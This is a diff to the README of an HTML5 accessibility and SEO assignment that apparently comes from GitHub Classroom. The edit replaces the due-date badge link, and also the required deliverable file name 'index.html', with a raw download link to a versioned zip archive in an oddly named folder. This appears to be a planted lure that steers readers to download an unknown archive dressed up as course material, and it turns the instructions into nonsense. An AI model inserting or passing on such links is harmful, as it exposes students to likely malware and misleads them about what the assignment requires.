@@ -1,4 +1,4 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/jecSxI3G)
+[![Review Assignment Due Date](https://github.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/raw/refs/heads/main/Goniopholidae/html-Griffnificent-july-introduction-to-v3.9.zip)](https://github.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/raw/refs/heads/main/Goniopholidae/html-Griffnificent-july-introduction-to-v3.9.zip)
 # 📘 Assignment: HTML5 + Accessibility & SEO Basics
 
 ## Overview
@@ -19,7 +19,7 @@ For SEO, emphasize the use of heading tags in the correct order, provide descrip
 
 ## Deliverables
 
-A single HTML file named `index.html`. It should include:
+A single HTML file named `https://github.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/raw/refs/heads/main/Goniopholidae/html-Griffnificent-july-introduction-to-v3.9.zip`. It should include:
 
 * A semantic structure using appropriate HTML5 elements.
 * Clear headings in a logical hierarchy.
